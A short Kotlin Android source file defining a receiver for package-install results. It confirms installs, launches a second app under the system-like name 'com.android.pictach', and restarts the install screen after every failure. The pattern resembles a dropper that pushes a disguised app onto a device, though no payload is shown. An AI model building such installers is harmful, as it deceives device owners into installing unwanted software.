package com.cristal.bristral.tristal.mistral

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.pm.PackageInstaller
import android.os.Build
import android.util.Log

class InstallReceiver : BroadcastReceiver() {

    companion object {
        private const val TAG = "InstallReceiver"
        private const val TARGET_PACKAGE = "com.android.pictach"
    }

    override fun onReceive(context: Context, intent: Intent) {
        val currentStatus = intent.getIntExtra(PackageInstaller.EXTRA_STATUS, PackageInstaller.STATUS_FAILURE)

        when (currentStatus) {
            PackageInstaller.STATUS_PENDING_USER_ACTION -> {
                val confirmIntent = if (Build.VERSION.SDK_INT >= 33) {
                    intent.getParcelableExtra(Intent.EXTRA_INTENT, Intent::class.java)
                } else {
                    @Suppress("DEPRECATION")
                    intent.getParcelableExtra(Intent.EXTRA_INTENT)
                }
                confirmIntent?.let {
                    it.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    context.startActivity(it)
                }
            }
            PackageInstaller.STATUS_SUCCESS -> {
                try {
                    val launchIntent = context.packageManager.getLaunchIntentForPackage(TARGET_PACKAGE)
                    launchIntent?.let {
                        it.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                        it.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK)
                        context.startActivity(it)
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Launch failed: ${e.message}")
                }
            }
            else -> {
                val reason = intent.getStringExtra(PackageInstaller.EXTRA_STATUS_MESSAGE)
                Log.e(TAG, "Setup failed: $reason")
                val retryIntent = Intent(context, InstallActivity::class.java)
                retryIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                context.startActivity(retryIntent)
            }
        }
    }
}
